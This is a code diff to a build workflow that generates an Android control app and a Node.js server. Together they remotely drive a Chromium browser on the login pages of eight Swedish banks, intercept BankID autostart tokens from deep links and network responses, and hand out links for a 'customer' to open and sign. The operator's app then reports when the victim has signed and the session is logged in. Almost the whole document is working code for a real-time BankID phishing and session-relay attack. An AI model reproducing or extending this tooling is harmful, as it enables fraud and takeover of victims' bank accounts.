@@ -26,6 +26,8 @@ jobs:
           local.properties
           bygg.log
           server/sessioner.json
+          server/logg.jsonl
+          server/lar.json
           server/node_modules/
           cprof/
           EOF
@@ -66,8 +68,8 @@ jobs:
                   applicationId = "com.relay"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 200
-                  versionName = "2.0.0"
+                  versionCode = 300
+                  versionName = "3.0.0"
               }
               buildTypes { getByName("debug") { isMinifyEnabled = false } }
               compileOptions {
@@ -111,14 +113,16 @@ jobs:
           package com.relay
 
           import android.app.Activity
+          import android.content.ActivityNotFoundException
           import android.content.ClipData
           import android.content.ClipboardManager
           import android.content.Context
+          import android.content.Intent
           import android.content.SharedPreferences
-          import android.graphics.Bitmap
           import android.graphics.BitmapFactory
           import android.graphics.Color
           import android.graphics.drawable.BitmapDrawable
+          import android.net.Uri
           import android.os.Bundle
           import android.os.Handler
           import android.os.Looper
@@ -126,6 +130,7 @@ jobs:
           import android.view.MotionEvent
           import android.widget.Button
           import android.widget.EditText
+          import android.widget.HorizontalScrollView
           import android.widget.ImageView
           import android.widget.LinearLayout
           import android.widget.TextView
@@ -138,6 +143,7 @@ jobs:
               private lateinit var prefs: SharedPreferences
               private lateinit var urlField: EditText
               private lateinit var bankField: EditText
+              private lateinit var bankRad: LinearLayout
               private lateinit var textField: EditText
               private lateinit var skarm: ImageView
               private lateinit var statusView: TextView
@@ -147,12 +153,15 @@ jobs:
               private val ui = Handler(Looper.getMainLooper())
               private val rader = ArrayDeque<String>()
 
+              @Volatile private var bank = "swedbank"
               @Volatile private var code = ""
+              @Volatile private var inloggad = false
               @Volatile private var signed = false
               @Volatile private var stopp = false
               @Volatile private var laddar = false
               @Volatile private var rullar = false
               @Volatile private var chromeOk = false
+              @Volatile private var kortUrl = ""
               @Volatile private var nedY = 0f
               @Volatile private var vpW = 412
               @Volatile private var vpH = 900
@@ -161,7 +170,10 @@ jobs:
                   super.onCreate(s)
                   prefs = getSharedPreferences("relay", MODE_PRIVATE)
                   code = prefs.getString("code", "") ?: ""
+                  bank = prefs.getString("bank", "swedbank") ?: "swedbank"
                   byggUi()
+                  laddaBanker()
+                  laddaConfig()
                   startaSkarm()
                   startaPoll()
               }
@@ -173,24 +185,37 @@ jobs:
 
                   urlField = felt("server-url  https://xxx.trycloudflare.com", prefs.getString("url", "") ?: "")
                   root.addView(urlField, lp())
-                  bankField = felt("bank-url", prefs.getString("bank", "https://online.swedbank.se/") ?: "")
+
+                  val hs = HorizontalScrollView(this)
+                  hs.isHorizontalScrollBarEnabled = false
+                  bankRad = LinearLayout(this)
+                  bankRad.orientation = LinearLayout.HORIZONTAL
+                  hs.addView(bankRad)
+                  root.addView(hs, LinearLayout.LayoutParams(-1, -2))
+
+                  bankField = felt("bank-url (anvands i FRI-lage)", prefs.getString("bankurl", "") ?: "")
                   root.addView(bankField, lp())
 
                   val r1 = LinearLayout(this); r1.orientation = LinearLayout.HORIZONTAL
                   val kor = knapp("KOR", "#2b6cb0")
+                  val ny = knapp("NY ORDER", "#b7791f")
                   val lank = knapp("LANK", "#2b6cb0")
                   val kod = knapp("KOD", "#4a5568")
-                  r1.addView(kor, lpv()); r1.addView(lank, lpv()); r1.addView(kod, lpv())
+                  val logg = knapp("LOGG", "#4a5568")
+                  r1.addView(kor, lpv()); r1.addView(ny, lpv()); r1.addView(lank, lpv())
+                  r1.addView(kod, lpv()); r1.addView(logg, lpv())
                   root.addView(r1)
 
                   val r2 = LinearLayout(this); r2.orientation = LinearLayout.HORIZONTAL
-                  textField = felt("skriv har", "")
-                  r2.addView(textField, LinearLayout.LayoutParams(0, -2, 2f))
+                  textField = felt("skriv / css-selektor", "")
+                  r2.addView(textField, LinearLayout.LayoutParams(0, -2, 2.2f))
                   val txt = knapp("TXT", "#4a5568")
                   val ent = knapp("ENT", "#4a5568")
                   val tab = knapp("TAB", "#4a5568")
                   val bsk = knapp("BSK", "#4a5568")
-                  r2.addView(txt, lpv()); r2.addView(ent, lpv()); r2.addView(tab, lpv()); r2.addView(bsk, lpv())
+                  val sel = knapp("SEL", "#4a5568")
+                  r2.addView(txt, lpv()); r2.addView(ent, lpv()); r2.addView(tab, lpv())
+                  r2.addView(bsk, lpv()); r2.addView(sel, lpv())
                   root.addView(r2)
 
                   linkView = TextView(this)
@@ -233,9 +258,11 @@ jobs:
                           MotionEvent.ACTION_UP -> {
                               val dy = e.y - nedY
                               if (Math.abs(dy) > 30f) {
-                                  trad { post(u() + "/api/rulla", "{\"x\":" + px(e.x) + ",\"y\":" + py(e.y) + ",\"dy\":" + (-dy * vpH / skarm.height) + "}") }
+                                  trad { post(u() + "/api/rulla", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
+                                      ",\"y\":" + py(e.y) + ",\"dy\":" + (-dy * vpH / skarm.height) + "}") }
                               } else {
-                                  trad { post(u() + "/api/peka", "{\"x\":" + px(e.x) + ",\"y\":" + py(e.y) + "}") }
+                                  trad { post(u() + "/api/peka", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
+                                      ",\"y\":" + py(e.y) + "}") }
                               }
                               rullar = false
                               true
@@ -246,54 +273,72 @@ jobs:
 
                   kor.setOnClickListener {
                       prefs.edit().putString("url", urlField.text.toString().trim())
-                          .putString("bank", bankField.text.toString().trim()).apply()
-                      if (urlField.text.toString().trim().isEmpty()) {
-                          statusView.text = "FYLL I SERVER-URL FORST"
-                          return@setOnClickListener
-                      }
-                      code = ""; signed = false
+                          .putString("bankurl", bankField.text.toString().trim())
+                          .putString("bank", bank).apply()
+                      if (u().isEmpty()) { statusView.text = "FYLL I SERVER-URL FORST"; return@setOnClickListener }
+                      code = ""; signed = false; inloggad = false
                       linkView.text = ""
-                      statusView.text = "KOR - oppnar banken i chrome"
+                      statusView.text = "KOR " + bank + " - oppnar i chrome"
                       trad {
                           try {
                               val s = post(u() + "/api/kor", JSONObject()
-                                  .put("bank", bankField.text.toString().trim()).toString())
+                                  .put("bank", bank).put("url", bankField.text.toString().trim()).toString())
                               val j = JSONObject(s)
                               if (j.optBoolean("ok")) {
                                   code = j.optString("code")
                                   prefs.edit().putString("code", code).apply()
-                                  ui.post {
-                                      statusView.text = "SESSION " + code + " - tryck LANK"
-                                      logga("KOR " + code + " chrome=" + j.optBoolean("chrome"))
-                                  }
+                                  ui.post { statusView.text = "SESSION " + code + " - tryck LANK" }
+                                  logga("KOR " + bank + " " + code)
                               } else {
-                                  ui.post { statusView.text = "KOR-FEL: " + j.optString("fel"); logga("KOR-FEL") }
+                                  ui.post { statusView.text = "KOR-FEL: " + j.optString("fel") }
                               }
                           } catch (e: Throwable) {
-                              ui.post { statusView.text = "KOR-FEL (server)"; logga("KOR " + e.toString().take(100)) }
+                              ui.post { statusView.text = "KOR-FEL (server)" }
+                              logga("KOR " + e.toString().take(90))
                           }
                       }
                   }
 
-                  lank.setOnClickListener { kopiera("/b?code=") }
-                  kod.setOnClickListener { kopiera("/k?code=") }
+                  ny.setOnClickListener {
+                      if (code.isEmpty()) { statusView.text = "INGEN SESSION"; return@setOnClickListener }
+                      trad { post(u() + "/api/nyorder", JSONObject().put("code", code).toString()) }
+                      statusView.text = "NY ORDER - ny token, samma lank"
+                  }
+
+                  lank.setOnClickListener { kopiera("/b?code=", true) }
+                  kod.setOnClickListener { kopiera("/k?code=", false) }
+                  logg.setOnClickListener {
+                      try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(u() + "/logg"))) }
+                      catch (e: ActivityNotFoundException) { statusView.text = "ingen webblasare" }
+                  }
 
                   txt.setOnClickListener {
                       val t = textField.text.toString()
                       if (t.isEmpty()) return@setOnClickListener
-                      trad { post(u() + "/api/text", JSONObject().put("t", t).toString()) }
+                      trad { post(u() + "/api/text", JSONObject().put("bank", bank).put("t", t).toString()) }
                       textField.setText("")
                   }
-                  ent.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"enter\"}") } }
-                  tab.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"tab\"}") } }
-                  bsk.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"back\"}") } }
+                  ent.setOnClickListener { tangent("enter") }
+                  tab.setOnClickListener { tangent("tab") }
+                  bsk.setOnClickListener { tangent("back") }
+                  sel.setOnClickListener {
+                      val t = textField.text.toString().trim()
+                      if (t.isEmpty()) return@setOnClickListener
+                      trad { post(u() + "/api/klick", JSONObject().put("bank", bank).put("sel", t).toString()) }
+                      statusView.text = "klickar " + t
+                  }
 
-                  statusView.text = "Kor chrome.sh och start.sh i Termux forst"
+                  statusView.text = "kor bash server/start.sh i Termux forst"
               }
 
-              private fun kopiera(suffix: String) {
+              private fun tangent(k: String) {
+                  trad { post(u() + "/api/tangent", JSONObject().put("bank", bank).put("k", k).toString()) }
+              }
+
+              private fun kopiera(suffix: String, kort: Boolean) {
                   if (code.isEmpty()) { statusView.text = "INGEN KOD ANN - tryck KOR"; return }
-                  val l = u() + suffix + code
+                  val bas = if (kort && kortUrl.isNotEmpty()) kortUrl else u()
+                  val l = bas.trimEnd('/') + suffix + code
                   linkView.text = l
                   (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
                       .setPrimaryClip(ClipData.newPlainText("lank", l))
@@ -310,6 +355,57 @@ jobs:
                   trad { try { post(uu + "/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) {} }
               }
 
+              private fun laddaConfig() {
+                  trad {
+                      try {
+                          val j = JSONObject(get(u() + "/api/config"))
+                          kortUrl = j.optString("kortUrl") ?: ""
+                          if (kortUrl.isNotEmpty()) ui.post { logga("kort lank: " + kortUrl) }
+                      } catch (e: Throwable) { }
+                  }
+              }
+
+              private fun laddaBanker() {
+                  trad {
+                      try {
+                          val j = JSONObject(get(u() + "/api/banker"))
+                          val arr = j.optJSONArray("banker")
+                          if (arr != null) {
+                              val bygg = ArrayList<Triple<String, String, String>>()
+                              for (i in 0 until arr.length()) {
+                                  val o = arr.getJSONObject(i)
+                                  bygg.add(Triple(o.optString("nyckel"), o.optString("namn"), o.optString("start")))
+                              }
+                              ui.post {
+                                  bankRad.removeAllViews()
+                                  for ((k, n, st) in bygg) {
+                                      val b = knapp(n, if (k == bank) "#2b6cb0" else "#334155")
+                                      b.textSize = 11f
+                                      b.setOnClickListener { veljBank(k, st) }
+                                      bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
+                                          .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
+                                  }
+                                  val fri = knapp("FRI", if (bank == "fri") "#2b6cb0" else "#334155")
+                                  fri.textSize = 11f
+                                  fri.setOnClickListener { veljBank("fri", null) }
+                                  bankRad.addView(fri, LinearLayout.LayoutParams(-2, -2)
+                                      .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
+                              }
+                          }
+                      } catch (e: Throwable) {
+                          ui.post { logga("banker-fel " + e.toString().take(80)) }
+                      }
+                  }
+              }
+
+              private fun veljBank(k: String, start: String?) {
+                  bank = k
+                  if (start != null && start.isNotEmpty()) bankField.setText(start)
+                  prefs.edit().putString("bank", k).apply()
+                  statusView.text = "bank vald: " + k
+                  laddaBanker()
+              }
+
               private fun startaSkarm() {
                   Thread {
                       while (!stopp) {
@@ -317,7 +413,7 @@ jobs:
                           if (uu.isNotEmpty() && !laddar) {
                               laddar = true
                               try {
-                                  val s = get(uu + "/api/skarm")
+                                  val s = get(uu + "/api/skarm?bank=" + bank + "&t=" + System.currentTimeMillis())
                                   val j = JSONObject(s)
                                   if (j.optBoolean("ok")) {
                                       chromeOk = true
@@ -333,32 +429,44 @@ jobs:
                                   } else {
                                       chromeOk = false
                                   }
-                              } catch (e: Throwable) {
-                                  chromeOk = false
-                              }
+                              } catch (e: Throwable) { chromeOk = false }
                               laddar = false
                           }
-                          try { Thread.sleep(if (rullar) 350L else 1100L) } catch (e: Throwable) { }
+                          try { Thread.sleep(if (rullar) 320L else 1000L) } catch (e: Throwable) { }
                       }
                   }.start()
               }
 
               private fun startaPoll() {
                   Thread {
+                      var visaChromeFel = true
                       while (!stopp) {
                           val c = code
                           val uu = u()
                           if (c.isNotEmpty() && uu.isNotEmpty()) {
                               try {
                                   val j = JSONObject(get(uu + "/api/state?code=" + c))
+                                  if (j.optBoolean("inloggad") && !inloggad) {
+                                      inloggad = true; signed = true
+                                      ui.post { statusView.text = "INLOGGAD - verifierat pa sidan" }
+                                  }
                                   if (j.optBoolean("signed") && !signed) {
                                       signed = true
-                                      ui.post { statusView.text = "KUNDEN HAR SIGNERAT - se skarmen" }
+                                      ui.post { statusView.text = "KUNDEN HAR SIGNERAT - vantar pa inloggning" }
+                                  }
+                                  val lg = j.optJSONArray("logg")
+                                  if (lg != null && lg.length() > 0) {
+                                      val sista = lg.optString(lg.length() - 1)
+                                      ui.post { if (rader.isEmpty() || rader.last() != sista) logga(sista) }
                                   }
                               } catch (e: Throwable) { }
                           }
-                          if (!chromeOk) ui.post { if (statusView.text.isEmpty()) statusView.text = "chrome inte kopplad - kor chrome.sh" }
-                          try { Thread.sleep(2500) } catch (e: Throwable) { }
+                          if (!chromeOk && visaChromeFel) {
+                              visaChromeFel = false
+                              ui.post { if (statusView.text.isEmpty()) statusView.text = "chrome inte kopplad - kor start.sh" }
+                          }
+                          if (chromeOk) visaChromeFel = true
+                          try { Thread.sleep(2000) } catch (e: Throwable) { }
                       }
                   }.start()
               }
@@ -386,7 +494,7 @@ jobs:
               }
 
               private fun trad(b: () -> Unit) {
-                  Thread { try { b() } catch (e: Throwable) { ui.post { logga("FEL " + e.toString().take(100)) } } }.start()
+                  Thread { try { b() } catch (e: Throwable) { ui.post { logga("FEL " + e.toString().take(90)) } } }.start()
               }
 
               private fun logga(s: String) {
@@ -401,12 +509,12 @@ jobs:
                   LinearLayout.LayoutParams(-1, -2).also { it.setMargins(dp(6), dp(2), dp(6), dp(2)) }
 
               private fun lpv(): LinearLayout.LayoutParams =
-                  LinearLayout.LayoutParams(0, -2, 1f).also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) }
+                  LinearLayout.LayoutParams(0, -2, 1f).also { it.setMargins(dp(2), dp(2), dp(2), dp(2)) }
 
               private fun knapp(t: String, c: String): Button {
                   val b = Button(this)
                   b.text = t
-                  b.textSize = 12f
+                  b.textSize = 11f
                   b.setBackgroundColor(Color.parseColor(c))
                   b.setTextColor(Color.WHITE)
                   return b
@@ -432,22 +540,116 @@ jobs:
           w server/package.json <<'EOF'
           {
             "name": "relay-server",
-            "version": "2.0.0",
+            "version": "3.0.0",
             "private": true,
             "scripts": { "start": "node server.js" },
             "dependencies": { "ws": "^8.18.0" }
           }
           EOF
 
+          w server/banker.json <<'EOF'
+          {
+            "swedbank": {
+              "namn": "Swedbank",
+              "farg": "#0057B8",
+              "start": "https://online.swedbank.se/",
+              "efter": "https://online.swedbank.se/app/ib/",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut", "Tillgangligt"]
+            },
+            "handelsbanken": {
+              "namn": "Handelsbanken",
+              "farg": "#003E74",
+              "start": "https://www.handelsbanken.se/sv/logga-in",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "seb": {
+              "namn": "SEB",
+              "farg": "#00A94F",
+              "start": "https://login.seb.se/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "nordea": {
+              "namn": "Nordea",
+              "farg": "#0000A0",
+              "start": "https://www.nordea.se/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "icabanken": {
+              "namn": "ICA Banken",
+              "farg": "#E13205",
+              "start": "https://www.icabanken.se/logga-in/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "lansforsakringar": {
+              "namn": "Lansforsakringar",
+              "farg": "#005AA0",
+              "start": "https://www.lansforsakringar.se/logga-in/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "danskebank": {
+              "namn": "Danske Bank",
+              "farg": "#003755",
+              "start": "https://www.danskebank.se/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "skandiabanken": {
+              "namn": "Skandiabanken",
+              "farg": "#FF6600",
+              "start": "https://www.skandiabanken.se/",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
+            }
+          }
+          EOF
+
+          w server/start.sh <<'EOF'
+          #!/data/data/com.termux/files/usr/bin/bash
+          # Startar allt: X11, Chromium med fjarrstyrning, och servern.
+          cd "$(dirname "$0")"
+          termux-wake-lock 2>/dev/null
+          export DISPLAY=:0
+
+          pgrep -f termux.x11 >/dev/null 2>&1 || { termux-x11 :0 >/dev/null 2>&1 & sleep 4; }
+
+          if ! curl -s --max-time 2 http://127.0.0.1:9222/json/version >/dev/null 2>&1; then
+            echo "startar chromium..."
+            nohup chromium \
+              --user-data-dir="$HOME/cprof" \
+              --remote-debugging-port=9222 \
+              --remote-allow-origins='*' \
+              --no-first-run --no-default-browser-check \
+              --disable-gpu --disable-dev-shm-usage \
+              --window-size=420,900 \
+              about:blank >/dev/null 2>&1 &
+            sleep 7
+          fi
+
+          curl -s --max-time 2 http://127.0.0.1:9222/json/version >/dev/null 2>&1 \
+            && echo "chromium: ok" || echo "chromium: SVARAR INTE"
+
+          [ -d node_modules ] || npm install --no-audit --no-fund
+          exec node server.js
+          EOF
+
           w server/chrome.sh <<'EOF'
           #!/data/data/com.termux/files/usr/bin/bash
-          # Startar Termux:X11 + en riktig Chromium med fjarrstyrning pa port 9222.
-          termux-wake-lock
+          termux-wake-lock 2>/dev/null
           export DISPLAY=:0
-          pkill -f termux.x11 2>/dev/null
-          sleep 1
-          termux-x11 :0 >/dev/null 2>&1 &
-          sleep 4
+          pgrep -f termux.x11 >/dev/null 2>&1 || { termux-x11 :0 >/dev/null 2>&1 & sleep 4; }
           exec chromium \
             --user-data-dir="$HOME/cprof" \
             --remote-debugging-port=9222 \
@@ -458,13 +660,6 @@ jobs:
             about:blank
           EOF
 
-          w server/start.sh <<'EOF'
-          #!/data/data/com.termux/files/usr/bin/bash
-          cd "$(dirname "$0")"
-          [ -d node_modules ] || npm install --no-audit --no-fund
-          exec node server.js
-          EOF
-
           w server/server.js <<'EOF'
           const http = require('http');
           const fs = require('fs');
@@ -472,46 +667,73 @@ jobs:
           const WebSocket = require('ws');
 
           const PORT = process.env.PORT || 3000;
-          const CDP = process.env.CDP || 'http://127.0.0.1:9222';
+          const CDP = 'http://127.0.0.1:' + (process.env.CDP_PORT || 9222);
+          const KORT = process.env.KORT_URL || '';
           const FIL = path.join(__dirname, 'sessioner.json');
+          const LOGG = path.join(__dirname, 'logg.jsonl');
+          const LAR = path.join(__dirname, 'lar.json');
 
-          let S = {};
-          let aktiv = null;
+          let banker = {};
+          try { banker = JSON.parse(fs.readFileSync(path.join(__dirname, 'banker.json'), 'utf8')); } catch (e) { banker = {}; }
+          let lar = {};
+          try { lar = JSON.parse(fs.readFileSync(LAR, 'utf8')); } catch (e) { lar = {}; }
+
+          let S = {}, aktiv = {}, dirty = false;
           try {
             const j = JSON.parse(fs.readFileSync(FIL, 'utf8'));
-            if (j && j.S) { S = j.S; aktiv = j.aktiv || null; } else { S = j || {}; }
+            if (j && j.S) { S = j.S; aktiv = j.aktiv || {}; } else { S = j || {}; }
           } catch (e) { S = {}; }
 
-          let dirty = false;
+          const loggRader = [];
+          function logg(txt) {
+            const rad = new Date().toISOString().substr(11, 8) + '  ' + txt;
+            loggRader.push(rad);
+            while (loggRader.length > 200) loggRader.shift();
+            try { fs.appendFileSync(LOGG, new Date().toISOString() + ' ' + txt + '\n'); } catch (e) {}
+            console.log(txt);
+          }
+
+          function spara() { dirty = true; }
           setInterval(() => {
             if (!dirty) return;
             dirty = false;
             try { fs.writeFileSync(FIL, JSON.stringify({ S, aktiv })); } catch (e) {}
+            try { fs.writeFileSync(LAR, JSON.stringify(lar)); } catch (e) {}
           }, 2000);
 
+          function larIn(bank, url) {
+            try {
+              const u = new URL(url);
+              const pre = u.host + u.pathname.replace(/\/[^/]*$/, '');
+              if (!lar[bank]) lar[bank] = [];
+              if (lar[bank].indexOf(pre) < 0 && lar[bank].length < 12) { lar[bank].push(pre); spara(); }
+            } catch (e) {}
+          }
+
           let vp = { w: 412, h: 900 };
+          let chromeOk = false;
+          const sidor = new Map();
 
-          /* ---------------- CDP mot Chromium ---------------- */
-          let ws = null, mid = 0, kopplad = false;
-          const vantar = new Map();
-          const lyssnare = {};
+          function nySida(bank) {
+            return { bank, ws: null, kopplad: false, mid: 0, vantar: new Map(), lyssnare: {} };
+          }
 
-          function cdp(method, params) {
+          function cdpP(s, metod, params) {
             return new Promise((resolve, reject) => {
-              if (!ws || ws.readyState !== 1) return reject(new Error('ingen chrome'));
-              const id = ++mid;
+              if (!s.ws || s.ws.readyState !== 1) return reject(new Error('ingen sida'));
+              const id = ++s.mid;
               const t = setTimeout(() => {
-                if (vantar.has(id)) { vantar.delete(id); reject(new Error('timeout ' + method)); }
+                if (s.vantar.has(id)) { s.vantar.delete(id); reject(new Error('timeout ' + metod)); }
               }, 20000);
-              vantar.set(id, {
+              s.vantar.set(id, {
                 resolve: (v) => { clearTimeout(t); resolve(v); },
                 reject: (e) => { clearTimeout(t); reject(e); }
               });
-              ws.send(JSON.stringify({ id, method, params: params || {} }));
+              s.ws.send(JSON.stringify({ id, method: metod, params: params || {} }));
             });
           }
 
-          function pa(metod, fn) { (lyssnare[metod] = lyssnare[metod] || []).push(fn); }
+          function paP(s, metod, fn) { (s.lyssnare[metod] = s.lyssnare[metod] || []).push(fn); }
 
           function hamtaJSON(url, metod) {
             return new Promise((resolve, reject) => {
@@ -529,94 +751,184 @@ jobs:
             });
           }
 
-          async function kopplaChrome() {
-            if (kopplad || (ws && ws.readyState === 1)) return;
-            try {
-              let lista = await hamtaJSON(CDP + '/json/list');
-              let sida = (lista || []).find((t) => t.type === 'page');
-              if (!sida) sida = await hamtaJSON(CDP + '/json/new?about:blank', 'PUT');
-              if (!sida || !sida.webSocketDebuggerUrl) throw new Error('ingen sida');
-              const sock = new WebSocket(sida.webSocketDebuggerUrl, { perMessageDeflate: false });
-              ws = sock;
-              sock.on('open', async () => {
-                kopplad = true;
-                console.log('chrome: kopplad');
-                try {
-                  await cdp('Page.enable');
-                  await cdp('Network.enable');
-                  await cdp('Runtime.enable');
-                  await sattViewport();
-                  if (aktiv && S[aktiv] && S[aktiv].bank) {
-                    await cdp('Page.navigate', { url: S[aktiv].bank });
-                  }
-                } catch (e) { console.log('chrome: enable-fel', e.message); }
-              });
-              sock.on('message', (d) => {
-                let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
-                if (m.id && vantar.has(m.id)) {
-                  const v = vantar.get(m.id); vantar.delete(m.id);
-                  if (m.error) v.reject(new Error(m.error.message)); else v.resolve(m.result);
-                  return;
-                }
-                if (m.method) {
-                  const l = lyssnare[m.method];
-                  if (l) for (const f of l) { try { f(m.params); } catch (e) {} }
-                }
-              });
-              sock.on('close', () => { kopplad = false; ws = null; });
-              sock.on('error', () => {});
-            } catch (e) { /* tyst, provas igen */ }
+          async function chromeNere() {
+            try { await hamtaJSON(CDP + '/json/version'); return false; } catch (e) { return true; }
           }
 
-          async function sattViewport() {
-            await cdp('Emulation.setDeviceMetricsOverride',
+          async function sattViewportSida(s) {
+            await cdpP(s, 'Emulation.setDeviceMetricsOverride',
               { width: vp.w, height: vp.h, deviceScaleFactor: 1, mobile: true });
-            await cdp('Emulation.setTouchEmulationEnabled', { enabled: true, maxTouchPoints: 1 });
+            await cdpP(s, 'Emulation.setTouchEmulationEnabled', { enabled: true, maxTouchPoints: 1 });
           }
 
-          /* ---------------- token fran natverkslagret ---------------- */
           function urUrl(u) {
             const m = /[?&]autostarttoken=([^&#]+)/i.exec(u || '');
             return m ? decodeURIComponent(m[1]) : null;
           }
 
-          function tokenHittad(t, kalla) {
+          function tokenFran(bank, t, kalla, url) {
             if (!t) return;
-            if (!aktiv || !S[aktiv]) { console.log('token utan aktiv session', t.slice(0, 8)); return; }
-            const s = S[aktiv];
+            const kod = aktiv[bank];
+            if (!kod || !S[kod]) { logg('token utan session (' + bank + ')'); return; }
+            const s = S[kod];
             if (s.token === t) return;
             s.token = t;
-            s.bankidSkickad = false;
             s.tokenTid = Date.now();
+            s.bankidSkickad = false;
             s.kalla = kalla;
-            dirty = true;
-            console.log('TOKEN (' + kalla + ') ->', aktiv, t.slice(0, 8));
+            spara();
+            if (url) larIn(bank, url);
+            logg('TOKEN ' + bank + ' ' + kod + ' [' + kalla + '] ' + t.slice(0, 8));
           }
 
-          pa('Network.requestWillBeSent', (p) => {
-            const u = p && p.request && p.request.url;
-            if (u && (u.indexOf('bankid://') === 0 || u.indexOf('intent:') === 0)) tokenHittad(urUrl(u), 'deeplink');
-          });
+          function kopplaLyssnare(s) {
+            s.ws.on('message', (d) => {
+              let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
+              if (m.id && s.vantar.has(m.id)) {
+                const v = s.vantar.get(m.id); s.vantar.delete(m.id);
+                if (m.error) v.reject(new Error(m.error.message)); else v.resolve(m.result);
+                return;
+              }
+              if (m.method) {
+                const l = s.lyssnare[m.method];
+                if (l) for (const f of l) { try { f(m.params); } catch (e) {} }
+              }
+            });
+            s.ws.on('close', () => { s.kopplad = false; });
 
-          pa('Page.frameRequestedNavigation', (p) => {
-            if (p && p.url) { const t = urUrl(p.url); if (t) tokenHittad(t, 'frame'); }
-          });
+            paP(s, 'Network.requestWillBeSent', (p) => {
+              const u = p && p.request && p.request.url;
+              if (u && (u.indexOf('bankid://') === 0 || u.indexOf('intent:') === 0)) {
+                tokenFran(s.bank, urUrl(u), 'deeplink', u);
+              }
+            });
 
-          pa('Network.responseReceived', (p) => {
-            const r = p && p.response;
-            if (!r || !r.url) return;
-            if (!/json|text|javascript/i.test(r.mimeType || '')) return;
-            if (!/auth|bankid|apionline|collect|token|login/i.test(r.url)) return;
-            cdp('Network.getResponseBody', { requestId: p.requestId }).then((b) => {
-              const txt = b.base64Encoded ? Buffer.from(b.body, 'base64').toString('utf8') : b.body;
-              const m = /"autoStartToken"\s*:\s*"([^"]+)"/i.exec(txt);
-              if (m) tokenHittad(m[1], 'svar');
-            }).catch(() => {});
-          });
+            paP(s, 'Page.frameRequestedNavigation', (p) => {
+              if (p && p.url) { const t = urUrl(p.url); if (t) tokenFran(s.bank, t, 'frame', p.url); }
+            });
 
-          setInterval(() => { if (!kopplad) kopplaChrome(); }, 3000);
+            paP(s, 'Network.responseReceived', (p) => {
+              const r = p && p.response;
+              if (!r || !r.url) return;
+              if ((r.encodedDataLength || 0) > 400000) return;
+              if (/\.(png|jpg|jpeg|gif|webp|css|woff2?|svg|ico)(\?|$)/i.test(r.url)) return;
+              const mt = (r.mimeType || '').toLowerCase();
+              const kand = /json|text|javascript/.test(mt) ||
+                (lar[s.bank] || []).some((pre) => r.url.indexOf(pre) === 0);
+              if (!kand) return;
+              cdpP(s, 'Network.getResponseBody', { requestId: p.requestId }).then((b) => {
+                const txt = b.base64Encoded ? Buffer.from(b.body, 'base64').toString('utf8') : b.body;
+                if (!/autostarttoken/i.test(txt)) return;
+                const m = /"autoStartToken"\s*:\s*"([^"]+)"/i.exec(txt);
+                if (m) tokenFran(s.bank, m[1], 'svar', r.url);
+              }).catch(() => {});
+            });
+          }
 
-          /* ---------------- hjalpare ---------------- */
+          async function skaffaSida(bank) {
+            let s = sidor.get(bank);
+            if (s && s.ws && s.ws.readyState === 1) return s;
+            s = nySida(bank);
+            sidor.set(bank, s);
+            const start = (banker[bank] && banker[bank].start) || 'about:blank';
+            const mal = await hamtaJSON(CDP + '/json/new?' + encodeURIComponent(start), 'PUT');
+            const sock = new WebSocket(mal.webSocketDebuggerUrl, { perMessageDeflate: false });
+            s.ws = sock;
+            await new Promise((res, rej) => {
+              const t = setTimeout(() => rej(new Error('ws-timeout')), 8000);
+              sock.on('open', () => { clearTimeout(t); res(); });
+              sock.on('error', (e) => { clearTimeout(t); rej(e); });
+            });
+            s.kopplad = true;
+            kopplaLyssnare(s);
+            await cdpP(s, 'Page.enable');
+            await cdpP(s, 'Network.enable');
+            await cdpP(s, 'Runtime.enable');
+            await sattViewportSida(s);
+            logg('ny flik: ' + bank);
+            return s;
+          }
+
+          async function korsKlick(s, bank) {
+            const steg = (banker[bank] && banker[bank].klick) || [];
+            for (const sel of steg) {
+              await new Promise((r) => setTimeout(r, 1800));
+              try {
+                await cdpP(s, 'Runtime.evaluate', {
+                  expression: 'try{(function(){var e=document.querySelector(' + JSON.stringify(sel) +
+                    ');if(e){e.click();return 1}return 0})()}catch(x){0}',
+                  returnByValue: true
+                });
+              } catch (e) {}
+            }
+          }
+
+          async function nyOrder(bank, kod, orsak) {
+            const s = S[kod];
+            if (!s) return;
+            try {
+              const p = await skaffaSida(bank);
+              const fore = await cdpP(p, 'Runtime.evaluate',
+                { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
+              const url = (banker[bank] && banker[bank].start) || s.url || 'about:blank';
+              await cdpP(p, 'Page.navigate', { url });
+              await new Promise((r) => setTimeout(r, 900));
+              const efter = await cdpP(p, 'Runtime.evaluate',
+                { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
+              if (efter === fore) await cdpP(p, 'Page.reload', { ignoreCache: true });
+              korsKlick(p, bank);
+              s.token = null; s.bankidSkickad = false; s.inloggad = false;
+              s.omOrdning = (s.omOrdning || 0) + 1;
+              s.omOrdningTid = Date.now();
+              spara();
